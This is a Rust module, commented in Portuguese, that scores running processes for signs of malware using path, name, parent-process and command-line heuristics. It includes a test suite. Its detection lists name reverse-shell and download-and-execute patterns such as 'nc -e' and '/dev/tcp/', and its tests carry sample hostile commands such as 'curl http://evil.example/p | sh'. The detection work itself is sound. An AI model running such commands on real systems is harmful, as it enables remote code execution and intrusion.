//! Heurísticas de detecção de processos suspeitos.
//!
//! Cada `check_*` recebe [`ProcessFacts`] e devolve `Option<Finding>`.
//! [`analyze`] roda todas, soma pesos, trunca em [`MAX_SCORE`] e decide
//! [`Severity`].
//!
//! Sem I/O, sem estado. Toda parametrização que dependa de ambiente
//! (pesos configuráveis, heurísticas liga/desliga) entra em Fase 8.

use super::mitre::{self, Technique};
use super::types::{Finding, FindingKind, MAX_SCORE, ProcessFacts, Severity, SuspicionReport};

/// Analisa um processo e devolve score + findings.
///
/// Cada heurística retorna no máximo 1 finding — não empilha por
/// sub-padrão (ex.: múltiplas needles na mesma cmdline valem só um
/// `SuspiciousCmdline`).
pub fn analyze(facts: &ProcessFacts<'_>) -> SuspicionReport {
    let mut findings = Vec::new();

    if let Some(f) = check_temp_dir(facts) {
        findings.push(f);
    }
    if let Some(f) = check_typosquatting(facts) {
        findings.push(f);
    }
    if let Some(f) = check_suspicious_parent(facts) {
        findings.push(f);
    }
    if let Some(f) = check_suspicious_cmdline(facts) {
        findings.push(f);
    }
    if let Some(f) = check_hidden_executable(facts) {
        findings.push(f);
    }
    if let Some(f) = check_user_writable_location(facts) {
        findings.push(f);
    }
    if facts.cpu_sustained_high {
        findings.push(Finding::new(
            FindingKind::CpuSustainedHigh,
            "uso de CPU sustentadamente alto",
        ));
    }

    let raw: u32 = findings.iter().map(|f| f.weight as u32).sum();
    let score = raw.min(MAX_SCORE as u32) as u8;

    SuspicionReport {
        score,
        severity: Severity::from_score(score),
        findings,
    }
}

// ---------------------------------------------------------------------------
// Heurísticas individuais
// ---------------------------------------------------------------------------

/// Executável em diretório temporário clássico.
fn check_temp_dir(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let path = facts.exe_path?;
    let norm = path.replace('\\', "/").to_ascii_lowercase();

    // Segmentos exatos — evita casar com "C:/TempFiles" ou "/tmpfoo".
    const NEEDLES: &[&str] = &["/tmp/", "/dev/shm/", "/var/tmp/", "/appdata/local/temp/"];

    let is_temp = NEEDLES.iter().any(|s| norm.contains(s))
        || norm.ends_with("/tmp")
        || norm.ends_with("/dev/shm")
        || norm.ends_with("/var/tmp")
        || norm.ends_with("/appdata/local/temp");

    if is_temp {
        Some(Finding::new(
            FindingKind::TempDir,
            format!("executável em diretório temporário: {path}"),
        ))
    } else {
        None
    }
}

/// Nome muito parecido com binário conhecido do SO (troca, omissão,
/// inserção ou substituição de 1-2 caracteres).
fn check_typosquatting(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let stem = strip_ext(facts.name).to_ascii_lowercase();
    // Nomes curtos geram muito ruído ("sc" ≈ "su").
    if stem.len() < 4 {
        return None;
    }

    const SYSTEM_NAMES: &[&str] = &[
        // Windows
        "svchost",
        "csrss",
        "winlogon",
        "lsass",
        "services",
        "wininit",
        "smss",
        "explorer",
        "taskhostw",
        "runtimebroker",
        "conhost",
        "dwm",
        "spoolsv",
        // Unix
        "init",
        "systemd",
        "bash",
        "sshd",
        "cron",
        "crond",
        "sudo",
        "login",
        "passwd",
        // macOS
        "launchd",
    ];

    // Distância aceitável depende do tamanho: nomes curtos, tolerância baixa.
    let limit = if stem.len() >= 6 { 2 } else { 1 };

    for candidate in SYSTEM_NAMES {
        if stem == *candidate {
            return None; // é o próprio — não é "quase"
        }
        let dist = levenshtein(&stem, candidate);
        let len_diff = (stem.len() as i32 - candidate.len() as i32).abs();
        if dist <= limit && len_diff <= 1 {
            return Some(Finding::new(
                FindingKind::Typosquatting,
                format!(
                    "\"{}\" a {} edição(ões) de \"{}\"",
                    facts.name, dist, candidate
                ),
            ));
        }
    }
    None
}

/// Cadeia pai→filho que historicamente indica execução maliciosa.
fn check_suspicious_parent(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let parent_raw = facts.parent_name?;
    let parent = strip_ext(parent_raw).to_ascii_lowercase();
    let child = strip_ext(facts.name).to_ascii_lowercase();

    const RULES: &[(&str, &[&str])] = &[
        // Office abrindo shell = macro maliciosa clássica
        (
            "winword",
            &["cmd", "powershell", "pwsh", "wscript", "cscript", "mshta"],
        ),
        (
            "excel",
            &["cmd", "powershell", "pwsh", "wscript", "cscript", "mshta"],
        ),
        (
            "powerpnt",
            &["cmd", "powershell", "pwsh", "wscript", "cscript", "mshta"],
        ),
        (
            "outlook",
            &["cmd", "powershell", "pwsh", "wscript", "cscript", "mshta"],
        ),
        // Navegador abrindo shell = exploit
        ("chrome", &["cmd", "powershell", "pwsh", "bash", "sh"]),
        ("firefox", &["cmd", "powershell", "pwsh", "bash", "sh"]),
        ("msedge", &["cmd", "powershell", "pwsh", "bash", "sh"]),
        // Servidor web abrindo shell = web shell / RCE
        ("nginx", &["bash", "sh", "cmd", "powershell"]),
        ("httpd", &["bash", "sh", "cmd", "powershell"]),
        ("apache2", &["bash", "sh", "cmd", "powershell"]),
        ("php-fpm", &["bash", "sh", "cmd", "powershell"]),
    ];

    for (p, children) in RULES {
        if parent == *p && children.contains(&child.as_str()) {
            return Some(Finding::new(
                FindingKind::SuspiciousParent,
                format!("cadeia suspeita: {parent_raw} → {}", facts.name),
            ));
        }
    }
    None
}

/// Padrões conhecidos de ofuscação / download / execução em cmdline.
fn check_suspicious_cmdline(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let cl = facts.cmdline;
    if cl.trim().is_empty() {
        return None;
    }
    let lc = cl.to_ascii_lowercase();

    const NEEDLES: &[(&str, &str, Technique)] = &[
        (
            "-encodedcommand",
            "PowerShell -EncodedCommand",
            mitre::POWERSHELL,
        ),
        ("-enc ", "PowerShell -Enc", mitre::POWERSHELL),
        (
            "invoke-expression",
            "PowerShell Invoke-Expression",
            mitre::POWERSHELL,
        ),
        ("iex(", "PowerShell IEX", mitre::POWERSHELL),
        ("iex (", "PowerShell IEX", mitre::POWERSHELL),
        (
            "downloadstring(",
            "download de payload via .NET",
            mitre::INGRESS_TOOL_TRANSFER,
        ),
        (
            "downloadfile(",
            "download de payload via .NET",
            mitre::INGRESS_TOOL_TRANSFER,
        ),
        (
            "frombase64string(",
            "decodificação Base64 em memória",
            mitre::DEOBFUSCATE_DECODE,
        ),
        (
            "mshta javascript:",
            "mshta com JavaScript",
            mitre::WINDOWS_COMMAND_SHELL,
        ),
        (
            "mshta http",
            "mshta baixando payload remoto",
            mitre::INGRESS_TOOL_TRANSFER,
        ),
        (
            "rundll32 javascript:",
            "rundll32 executando JavaScript",
            mitre::WINDOWS_COMMAND_SHELL,
        ),
        (
            "certutil -urlcache",
            "certutil baixando payload",
            mitre::INGRESS_TOOL_TRANSFER,
        ),
        (
            "certutil -decode",
            "certutil decodificando arquivo",
            mitre::DEOBFUSCATE_DECODE,
        ),
        (
            "nc -e",
            "netcat com execução (-e)",
            mitre::NON_APP_LAYER_PROTOCOL,
        ),
        (
            "ncat -e",
            "ncat com execução (-e)",
            mitre::NON_APP_LAYER_PROTOCOL,
        ),
        (
            "/dev/tcp/",
            "redirect TCP via /dev/tcp",
            mitre::NON_APP_LAYER_PROTOCOL,
        ),
    ];

    for (needle, label, tech) in NEEDLES {
        if lc.contains(needle) {
            return Some(Finding::with_technique(
                FindingKind::SuspiciousCmdline,
                format!("linha de comando suspeita: {label}"),
                *tech,
            ));
        }
    }

    // Cadeia "curl ... | sh" (download seguido de execução por pipe).
    let has_downloader = lc.contains("curl ") || lc.contains("wget ");
    let has_pipe_shell = lc.contains("| sh")
        || lc.contains("|sh")
        || lc.contains("| bash")
        || lc.contains("|bash")
        || lc.contains("| zsh")
        || lc.contains("|zsh");

    if has_downloader && has_pipe_shell {
        return Some(Finding::with_technique(
            FindingKind::SuspiciousCmdline,
            "download seguido de execução por pipe para shell",
            mitre::INGRESS_TOOL_TRANSFER,
        ));
    }

    None
}

/// Nome de arquivo com truques de engenharia social / Unicode.
fn check_hidden_executable(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let name = facts.name;

    // RTL override (U+202E) — inverte visualmente a extensão.
    if name.contains('\u{202E}') {
        return Some(Finding::new(
            FindingKind::HiddenExecutable,
            "nome contém RTL override (U+202E)",
        ));
    }

    let lc = name.to_ascii_lowercase();

    // Extensão dupla enganosa: "foto.jpg.exe", "nota.pdf.exe", ...
    const DECOYS: &[&str] = &[
        ".pdf.exe",
        ".doc.exe",
        ".docx.exe",
        ".xls.exe",
        ".xlsx.exe",
        ".jpg.exe",
        ".jpeg.exe",
        ".png.exe",
        ".gif.exe",
        ".txt.exe",
        ".zip.exe",
        ".rar.exe",
        ".mp3.exe",
        ".mp4.exe",
        ".avi.exe",
    ];
    for d in DECOYS {
        if lc.ends_with(d) {
            return Some(Finding::new(
                FindingKind::HiddenExecutable,
                format!("extensão dupla enganosa: {name}"),
            ));
        }
    }

    // Espaço antes da extensão (Windows ignora silenciosamente).
    for ext in [".exe", ".com", ".bat", ".cmd", ".scr", ".ps1"] {
        let needle = format!(" {ext}");
        if lc.ends_with(&needle) {
            return Some(Finding::new(
                FindingKind::HiddenExecutable,
                format!("espaço antes da extensão: {name}"),
            ));
        }
    }

    None
}

/// Executável em pasta de usuário onde binários não deveriam rodar.
fn check_user_writable_location(facts: &ProcessFacts<'_>) -> Option<Finding> {
    let path = facts.exe_path?;
    let norm = path.replace('\\', "/").to_ascii_lowercase();

    const NEEDLES: &[&str] = &[
        "/downloads/",
        "/desktop/",
        "/documents/",
        "/onedrive/",
        "/public/",
    ];

    for n in NEEDLES {
        if norm.contains(n) {
            return Some(Finding::new(
                FindingKind::UserWritableLocation,
                format!("executável em pasta de usuário: {path}"),
            ));
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Utilidades
// ---------------------------------------------------------------------------

/// Remove a última extensão de um nome (`nota.pdf.exe` → `nota.pdf`).
/// Sem ponto ou ponto na posição 0 → devolve o original.
pub(super) fn strip_ext(name: &str) -> &str {
    match name.rfind('.') {
        Some(i) if i > 0 => &name[..i],
        _ => name,
    }
}

/// Distância de Levenshtein (número mínimo de edições).
/// O(n*m) com duas linhas — suficiente para nomes de binários.
fn levenshtein(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    let (n, m) = (a.len(), b.len());

    if n == 0 {
        return m;
    }
    if m == 0 {
        return n;
    }

    let mut prev: Vec<usize> = (0..=m).collect();
    let mut curr = vec![0usize; m + 1];

    for i in 1..=n {
        curr[0] = i;
        for j in 1..=m {
            let cost = if a[i - 1] == b[j - 1] { 0 } else { 1 };
            curr[j] = (prev[j] + 1).min(curr[j - 1] + 1).min(prev[j - 1] + cost);
        }
        std::mem::swap(&mut prev, &mut curr);
    }

    prev[m]
}

// ---------------------------------------------------------------------------
// Testes
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// Helper para montar fatos com o mínimo de ruído nos testes.
    fn facts<'a>(
        name: &'a str,
        exe: Option<&'a str>,
        cmd: &'a str,
        parent: Option<&'a str>,
    ) -> ProcessFacts<'a> {
        ProcessFacts {
            pid: 1234,
            parent_pid: None,
            name,
            exe_path: exe,
            cmdline: cmd,
            parent_name: parent,
            user: None,
            cpu_sustained_high: false,
        }
    }

    #[test]
    fn clean_process_scores_zero() {
        let f = facts(
            "explorer.exe",
            Some(r"C:\Windows\explorer.exe"),
            "",
            Some("userinit.exe"),
        );
        let r = analyze(&f);
        assert_eq!(r.score, 0);
        assert_eq!(r.severity, Severity::Clean);
        assert!(r.is_clean());
    }

    #[test]
    fn levenshtein_basic() {
        assert_eq!(levenshtein("svchost", "svchost"), 0);
        assert_eq!(levenshtein("scvhost", "svchost"), 2); // transposição
        assert_eq!(levenshtein("svchost", "svchosts"), 1);
        assert_eq!(levenshtein("", "abc"), 3);
        assert_eq!(levenshtein("abc", ""), 3);
    }

    #[test]
    fn typosquatting_detected() {
        let f = facts(
            "scvhost.exe",
            Some(r"C:\Users\u\AppData\Local\Temp\scvhost.exe"),
            "",
            None,
        );
        let r = analyze(&f);
        let kinds: Vec<_> = r.findings.iter().map(|x| x.kind).collect();
        assert!(kinds.contains(&FindingKind::Typosquatting));
        assert!(kinds.contains(&FindingKind::TempDir));
        assert!(r.score >= 70);
    }

    #[test]
    fn typosquatting_maps_to_masquerading_technique() {
        let f = facts(
            "scvhost.exe",
            Some(r"C:\Users\u\AppData\Local\Temp\scvhost.exe"),
            "",
            None,
        );
        let r = analyze(&f);
        let t = r
            .findings
            .iter()
            .find(|f| f.kind == FindingKind::Typosquatting)
            .expect("typosquatting should fire");
        assert_eq!(t.technique, Some(mitre::MASQUERADING_NAME_OR_LOCATION));
    }

    #[test]
    fn temp_dir_no_false_positive() {
        let f = facts("app.exe", Some(r"C:\Apps\Temperature\app.exe"), "", None);
        let r = analyze(&f);
        assert!(!r.findings.iter().any(|x| x.kind == FindingKind::TempDir));
    }

    #[test]
    fn office_spawning_shell_flagged() {
        let f = facts(
            "powershell.exe",
            Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            "powershell -nop -w hidden -EncodedCommand SQBFAFgA",
            Some("winword.exe"),
        );
        let r = analyze(&f);
        let kinds: Vec<_> = r.findings.iter().map(|x| x.kind).collect();
        assert!(kinds.contains(&FindingKind::SuspiciousParent));
        assert!(kinds.contains(&FindingKind::SuspiciousCmdline));
        assert_eq!(r.score, 65);
        assert_eq!(r.severity, Severity::Suspicious);
    }

    #[test]
    fn suspicious_cmdline_maps_to_powershell_technique() {
        let f = facts(
            "powershell.exe",
            Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            "powershell -nop -EncodedCommand SQBFAFgA",
            Some("explorer.exe"),
        );
        let r = analyze(&f);
        let cmd = r
            .findings
            .iter()
            .find(|f| f.kind == FindingKind::SuspiciousCmdline)
            .expect("cmdline finding should fire");
        assert_eq!(cmd.technique, Some(mitre::POWERSHELL));
    }

    #[test]
    fn download_pipe_shell_detected() {
        let f = facts(
            "sh",
            Some("/bin/sh"),
            "curl http://evil.example/p | sh",
            Some("nginx"),
        );
        let r = analyze(&f);
        let kinds: Vec<_> = r.findings.iter().map(|x| x.kind).collect();
        assert!(kinds.contains(&FindingKind::SuspiciousParent));
        assert!(kinds.contains(&FindingKind::SuspiciousCmdline));
    }

    #[test]
    fn double_extension_detected() {
        let f = facts(
            "nota.pdf.exe",
            Some(r"C:\Users\u\Downloads\nota.pdf.exe"),
            "",
            None,
        );
        let r = analyze(&f);
        let kinds: Vec<_> = r.findings.iter().map(|x| x.kind).collect();
        assert!(kinds.contains(&FindingKind::HiddenExecutable));
        assert!(kinds.contains(&FindingKind::UserWritableLocation));
        assert_eq!(r.score, 40);
        assert_eq!(r.severity, Severity::Attention);
    }

    #[test]
    fn rtl_override_detected() {
        let f = facts("foto\u{202E}gpj.exe", None, "", None);
        let r = analyze(&f);
        assert!(
            r.findings
                .iter()
                .any(|x| x.kind == FindingKind::HiddenExecutable)
        );
    }

    #[test]
    fn score_capped_at_100() {
        let f = ProcessFacts {
            pid: 9999,
            parent_pid: Some(100),
            name: "scvhost.exe",
            exe_path: Some(r"C:\Users\u\Downloads\scvhost.exe"),
            cmdline: "powershell -enc SQBFAFgA",
            parent_name: Some("winword.exe"),
            user: None,
            cpu_sustained_high: true,
        };
        let r = analyze(&f);
        assert_eq!(r.score, 100);
        assert_eq!(r.severity, Severity::Critical);
    }

    #[test]
    fn severity_thresholds() {
        assert_eq!(Severity::from_score(0), Severity::Clean);
        assert_eq!(Severity::from_score(19), Severity::Clean);
        assert_eq!(Severity::from_score(20), Severity::Attention);
        assert_eq!(Severity::from_score(49), Severity::Attention);
        assert_eq!(Severity::from_score(50), Severity::Suspicious);
        assert_eq!(Severity::from_score(79), Severity::Suspicious);
        assert_eq!(Severity::from_score(80), Severity::Critical);
        assert_eq!(Severity::from_score(100), Severity::Critical);
    }
}
